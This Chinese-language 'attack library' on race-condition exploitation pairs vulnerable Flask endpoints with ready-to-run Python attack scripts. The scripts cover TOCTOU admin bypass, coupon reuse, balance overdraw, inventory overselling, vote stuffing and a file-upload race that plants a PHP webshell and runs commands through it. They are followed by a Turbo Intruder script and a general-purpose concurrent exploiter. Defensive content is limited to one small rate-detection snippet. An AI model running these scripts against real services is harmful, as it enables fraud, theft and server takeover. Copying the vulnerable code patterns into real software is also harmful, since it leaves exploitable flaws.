# 竞态条件-并发攻击 攻击库

## 漏洞概述

竞态条件(Race Condition)是指多个线程或进程并发访问和操作共享资源时,由于执行顺序的不确定性导致的安全漏洞。在Web应用中,竞态条件可以被用来绕过业务逻辑、权限检查、资源限制等安全控制。

**攻击价值**:
- 绕过权限检查(TOCTOU - Time of Check to Time of Use)
- 突破资源限制(如金额、库存、次数限制)
- 重复消费资源(优惠券、积分等)
- 权限提升
- 数据完整性破坏

**常见场景**:
- 账户余额操作
- 优惠券/折扣码使用
- 库存扣减
- 权限验证
- 文件上传限制
- 投票/点赞系统

## 核心攻击技术

### 1. TOCTOU (Time-of-Check to Time-of-Use)

**原理**: 检查和使用之间存在时间窗口,在此期间状态可能被改变

**经典场景**: 权限验证和实际操作分离

**漏洞代码示例 (Python/Flask)**:

```python
@app.route('/admin_panel')
def admin_panel():
    # 第一步: 验证会话 (Check)
    verify_session()
    
    # *** 时间窗口 - 会话可能被修改 ***
    
    # 第二步: 获取用户信息 (Use)
    sess = get_session()
    user = User.query.filter_by(username=sess.get('username')).first()
    
    # 第三步: 检查权限
    if user.is_admin:
        # 读取敏感文件
        with open('/flag') as f:
            flag = f.read()
        return render_template('admin.html', flag=flag)
    else:
        return "Access Denied"
```

**攻击原理**: 在`verify_session()`通过后、`user.is_admin`检查前,通过并发请求修改会话状态

**攻击脚本**:

```python
#!/usr/bin/env python3
import requests
import threading
import time

class TOCTOUExploit:
    """TOCTOU竞态条件利用工具"""
    
    def __init__(self, target_url, normal_session, admin_session):
        self.target_url = target_url
        self.normal_session = normal_session
        self.admin_session = admin_session
        self.success = False
        self.flag = None
        
    def normal_user_request(self):
        """普通用户请求 - 通过verify_session()"""
        cookies = {'session': self.normal_session}
        for i in range(1000):
            if self.success:
                break
            try:
                response = requests.get(
                    self.target_url,
                    cookies=cookies,
                    timeout=5
                )
                
                # 检查是否成功获取admin内容
                if 'flag' in response.text.lower() and \
                   'access denied' not in response.text.lower():
                    self.success = True
                    self.flag = response.text
                    print(f"[+] 成功! 获取到flag!")
                    print(response.text)
                    
            except Exception as e:
                pass
    
    def admin_user_request(self):
        """管理员用户请求 - 在检查时提供admin状态"""
        cookies = {'session': self.admin_session}
        for i in range(1000):
            if self.success:
                break
            try:
                requests.get(
                    self.target_url,
                    cookies=cookies,
                    timeout=5
                )
            except:
                pass
    
    def exploit(self):
        """执行TOCTOU利用"""
        print("[*] 开始TOCTOU竞态条件攻击...")
        print(f"[*] 目标: {self.target_url}")
        
        threads = []
        
        # 创建多个线程交替发送请求
        for i in range(20):
            if i % 2 == 0:
                t = threading.Thread(target=self.normal_user_request)
            else:
                t = threading.Thread(target=self.admin_user_request)
            threads.append(t)
            t.start()
        
        # 等待所有线程完成
        for t in threads:
            t.join()
        
        if self.success:
            print("\n[+] 利用成功!")
            return self.flag
        else:
            print("\n[-] 利用失败")
            return None

# 使用示例
exploit = TOCTOUExploit(
    target_url="http://target.com/admin_panel",
    normal_session="normal_user_session_id",
    admin_session="admin_user_session_id"
)
exploit.exploit()
```

### 2. 并发优惠券/折扣码利用

**原理**: 系统在检查和标记优惠券使用之间存在时间窗口

**漏洞代码示例**:

```python
@app.route('/apply_coupon', methods=['POST'])
def apply_coupon():
    coupon_code = request.json.get('code')
    user_id = session.get('user_id')
    
    # 检查优惠券是否已使用
    coupon = Coupon.query.filter_by(code=coupon_code).first()
    if coupon.used:
        return jsonify({'error': 'Coupon already used'}), 400
    
    # *** 时间窗口 - 多个请求可能同时通过检查 ***
    
    # 应用折扣
    apply_discount(user_id, coupon.amount)
    
    # 标记为已使用
    coupon.used = True
    db.session.commit()
    
    return jsonify({'success': True})
```

**攻击脚本**:

```python
#!/usr/bin/env python3
import requests
import threading
import json

def exploit_coupon_race(target_url, coupon_code, session_token, num_threads=50):
    """
    并发利用优惠券竞态条件
    
    参数:
        target_url: 优惠券应用接口
        coupon_code: 优惠券代码
        session_token: 用户会话令牌
        num_threads: 并发线程数
    """
    success_count = 0
    lock = threading.Lock()
    
    def send_request():
        nonlocal success_count
        
        headers = {
            'Content-Type': 'application/json',
            'Cookie': f'session={session_token}'
        }
        
        data = {'code': coupon_code}
        
        try:
            response = requests.post(
                target_url,
                headers=headers,
                json=data,
                timeout=5
            )
            
            if response.status_code == 200:
                with lock:
                    success_count += 1
                    print(f"[+] 成功应用优惠券! 总计: {success_count}")
        
        except Exception as e:
            pass
    
    # 创建并启动线程
    threads = []
    for i in range(num_threads):
        t = threading.Thread(target=send_request)
        threads.append(t)
        t.start()
    
    # 等待完成
    for t in threads:
        t.join()
    
    print(f"\n[*] 攻击完成! 成功应用 {success_count} 次优惠券")
    return success_count

# 使用示例
exploit_coupon_race(
    "http://target.com/api/apply_coupon",
    "DISCOUNT50",
    "user_session_token",
    num_threads=100
)
```

### 3. 并发账户余额操作

**原理**: 并发请求导致余额检查和扣减不同步

**漏洞代码**:

```python
@app.route('/transfer', methods=['POST'])
def transfer_money():
    amount = int(request.json.get('amount'))
    to_account = request.json.get('to_account')
    from_account = session.get('account_id')
    
    # 检查余额
    balance = get_balance(from_account)
    if balance < amount:
        return jsonify({'error': 'Insufficient balance'}), 400
    
    # *** 时间窗口 - 余额可能在多个请求中被重复使用 ***
    
    # 扣款
    deduct_balance(from_account, amount)
    
    # 到账
    add_balance(to_account, amount)
    
    return jsonify({'success': True})
```

**攻击脚本**:

```python
def exploit_balance_race(api_url, from_account, to_account, balance, num_requests=10):
    """
    利用余额竞态条件实现超额转账
    
    示例: 账户余额100元,但可以并发转账10次100元
    """
    
    def transfer():
        data = {
            'from_account': from_account,
            'to_account': to_account,
            'amount': balance  # 每次转账全部余额
        }
        
        response = requests.post(api_url, json=data)
        
        if response.status_code == 200:
            print(f"[+] 转账成功: {balance}元")
    
    # 同时发起多个转账请求
    threads = []
    for i in range(num_requests):
        t = threading.Thread(target=transfer)
        threads.append(t)
        t.start()
    
    for t in threads:
        t.join()
    
    print(f"[*] 完成! 尝试转账 {num_requests * balance}元")
```

### 4. 库存超卖竞态条件

**原理**: 库存检查和扣减之间的时间窗口

**漏洞代码**:

```python
@app.route('/purchase', methods=['POST'])
def purchase_item():
    item_id = request.json.get('item_id')
    quantity = request.json.get('quantity')
    
    # 检查库存
    stock = get_stock(item_id)
    if stock < quantity:
        return jsonify({'error': 'Out of stock'}), 400
    
    # *** 竞态窗口 ***
    
    # 扣减库存
    reduce_stock(item_id, quantity)
    
    # 创建订单
    create_order(session['user_id'], item_id, quantity)
    
    return jsonify({'success': True})
```

**攻击脚本**:

```python
def exploit_stock_race(api_url, item_id, stock_quantity):
    """
    并发购买超过库存数量的商品
    
    参数:
        api_url: 购买API
        item_id: 商品ID
        stock_quantity: 实际库存(如只有10件)
    """
    
    # 尝试购买的数量(远超实际库存)
    target_quantity = stock_quantity * 10
    
    def buy():
        data = {
            'item_id': item_id,
            'quantity': stock_quantity  # 每次购买全部库存
        }
        
        response = requests.post(api_url, json=data)
        if response.status_code == 200:
            print(f"[+] 购买成功: {stock_quantity}件")
    
    # 并发发起请求
    threads = [threading.Thread(target=buy) for _ in range(10)]
    
    for t in threads:
        t.start()
    for t in threads:
        t.join()
```

### 5. 投票/点赞竞态条件

**原理**: 检查用户是否已投票和记录投票之间的窗口

**攻击脚本**:

```python
def exploit_vote_race(vote_url, target_id, num_votes=100):
    """
    绕过"每人只能投一票"的限制
    """
    
    def vote():
        data = {'target_id': target_id}
        response = requests.post(vote_url, json=data)
        
        if response.status_code == 200:
            print("[+] 投票成功")
    
    threads = [threading.Thread(target=vote) for _ in range(num_votes)]
    
    # 几乎同时发起所有请求
    for t in threads:
        t.start()
    for t in threads:
        t.join()
```

### 6. 文件上传竞态条件

**原理**: 上传文件和安全检查之间的窗口

**攻击场景**: 
1. 上传恶意文件
2. 在安全扫描完成前快速访问/执行
3. 文件被删除前已执行恶意代码

**攻击脚本**:

```python
import requests
import threading
import time

def exploit_upload_race(upload_url, file_url):
    """
    上传并竞态执行恶意文件
    """
    
    def upload_file():
        # 上传PHP webshell
        files = {'file': ('shell.php', '<?php system($_GET["cmd"]); ?>')}
        requests.post(upload_url, files=files)
        print("[*] 文件已上传")
    
    def access_file():
        # 快速访问上传的文件
        time.sleep(0.1)  # 稍微等待上传完成
        for i in range(100):
            try:
                response = requests.get(file_url + '/shell.php?cmd=cat /flag')
                if 'flag' in response.text.lower():
                    print(f"[+] 成功执行! Flag: {response.text}")
                    return
            except:
                pass
    
    # 同时上传和访问
    t1 = threading.Thread(target=upload_file)
    t2 = threading.Thread(target=access_file)
    
    t1.start()
    t2.start()
    
    t1.join()
    t2.join()
```

## 高级利用技术

### 1. 延时增加成功率

```python
def precise_timing_attack(url, delay_ms=50):
    """
    精确控制请求时间以增加成功率
    
    参数:
        delay_ms: 两个请求之间的延时(毫秒)
    """
    
    def request_with_delay(delay):
        time.sleep(delay / 1000.0)
        requests.post(url, json={'action': 'exploit'})
    
    threads = []
    for i in range(10):
        # 逐步增加延时
        delay = delay_ms * i
        t = threading.Thread(target=request_with_delay, args=(delay,))
        threads.append(t)
        t.start()
    
    for t in threads:
        t.join()
```

### 2. Burp Suite Turbo Intruder

**利用脚本**:

```python
# Turbo Intruder脚本
def queueRequests(target, wordlists):
    engine = RequestEngine(
        endpoint=target.endpoint,
        concurrentConnections=50,
        requestsPerConnection=100,
        pipeline=False
    )
    
    # 并发发送100个相同请求
    for i in range(100):
        engine.queue(target.req)

def handleResponse(req, interesting):
    table.add(req)
```

### 3. 多阶段竞态攻击

```python
def multi_stage_race_attack(urls):
    """
    多阶段竞态攻击
    
    示例: 先竞态创建多个会话,再竞态提升每个会话的权限
    """
    
    # 阶段1: 并发创建会话
    sessions = []
    def create_session():
        resp = requests.post(urls['create_session'])
        sessions.append(resp.cookies.get('session'))
    
    threads = [threading.Thread(target=create_session) for _ in range(10)]
    for t in threads:
        t.start()
    for t in threads:
        t.join()
    
    # 阶段2: 对每个会话进行权限提升竞态攻击
    def elevate_privilege(session):
        cookies = {'session': session}
        requests.post(urls['admin_upgrade'], cookies=cookies)
    
    threads = [threading.Thread(target=elevate_privilege, args=(s,)) 
               for s in sessions]
    for t in threads:
        t.start()
    for t in threads:
        t.join()
```

## 综合利用工具

```python
#!/usr/bin/env python3
import requests
import threading
import time
from queue import Queue

class RaceConditionExploiter:
    """竞态条件综合利用工具"""
    
    def __init__(self, target_url, num_threads=50):
        self.target_url = target_url
        self.num_threads = num_threads
        self.results = Queue()
        self.success_count = 0
        
    def worker(self, payload, cookies=None, headers=None):
        """工作线程"""
        try:
            response = requests.post(
                self.target_url,
                json=payload,
                cookies=cookies,
                headers=headers,
                timeout=5
            )
            
            self.results.put({
                'status': response.status_code,
                'text': response.text,
                'success': response.status_code == 200
            })
            
            if response.status_code == 200:
                self.success_count += 1
                
        except Exception as e:
            self.results.put({'error': str(e)})
    
    def race_attack(self, payload, cookies=None, headers=None):
        """执行竞态攻击"""
        print(f"[*] 启动竞态攻击: {self.num_threads}个并发线程")
        
        threads = []
        for i in range(self.num_threads):
            t = threading.Thread(
                target=self.worker,
                args=(payload, cookies, headers)
            )
            threads.append(t)
            t.start()
        
        # 等待所有线程完成
        for t in threads:
            t.join()
        
        print(f"[*] 攻击完成! 成功: {self.success_count}/{self.num_threads}")
        return self.success_count
    
    def get_results(self):
        """获取所有结果"""
        results = []
        while not self.results.empty():
            results.append(self.results.get())
        return results

# 使用示例
if __name__ == "__main__":
    # 优惠券竞态
    exploiter = RaceConditionExploiter(
        "http://target.com/api/apply_coupon",
        num_threads=100
    )
    
    payload = {'code': 'SAVE50'}
    cookies = {'session': 'user_session_token'}
    
    success = exploiter.race_attack(payload, cookies=cookies)
    
    if success > 1:
        print(f"[+] 成功利用竞态条件! 重复使用优惠券 {success} 次")
```

## 检测与防御

### 检测方法

```python
# 检测异常并发
def detect_race_condition_attempt():
    from collections import defaultdict
    import time
    
    # 记录每个用户的请求时间
    user_requests = defaultdict(list)
    
    def check_request(user_id):
        now = time.time()
        
        # 获取最近1秒内的请求
        recent = [t for t in user_requests[user_id] if now - t < 1.0]
        
        # 如果1秒内超过10个请求,可能是竞态攻击
        if len(recent) > 10:
            return True
        
        user_requests[user_id].append(now)
        return False
```

## 关键成功要点

1. **并发数量**: 通常需要50-1000个并发请求
2. **时间窗口**: 越小越难利用,需要更多尝试
3. **网络延迟**: 本地测试更容易成功
4. **服务器负载**: 高负载时窗口更大
5. **持久化**: 多次尝试增加成功率

## 成功标志

- 多次使用一次性资源(优惠券、积分等)
- 超额消费账户余额
- 绕过"每人一次"限制
- 超卖库存
- 权限提升成功
- 获取flag或敏感数据
